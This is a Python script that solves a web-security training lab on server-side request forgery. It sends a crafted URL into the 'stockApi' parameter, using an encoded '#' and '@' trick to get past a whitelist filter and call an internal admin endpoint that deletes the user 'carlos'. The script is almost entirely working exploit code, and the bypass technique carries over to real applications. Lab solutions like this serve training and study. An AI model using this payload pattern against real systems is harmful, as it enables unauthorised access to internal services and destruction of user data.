############################################################################
#
# Lab: SSRF with whitelist-based input filter
#
# Hack Steps:
#      1. Inject payload into 'stockApi' parameter to delete carlos using
#         SSRF with whitelist-based input filter bypass
#      2. Check that carlos doesn't exist anymore in the admin panel
#
############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a9b0044048d83f08034121600650068.web-security-academy.net" 

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "stockApi")
    print(Fore.WHITE + "❯❯ Injecting payload to delete carlos using SSRF with whitelist-based input filter bypass.. ", end="", flush=True)

    payload = "http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos"
    data =  { "stockApi": payload }

    try:
        requests.post(f"{LAB_URL}/product/stock", data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
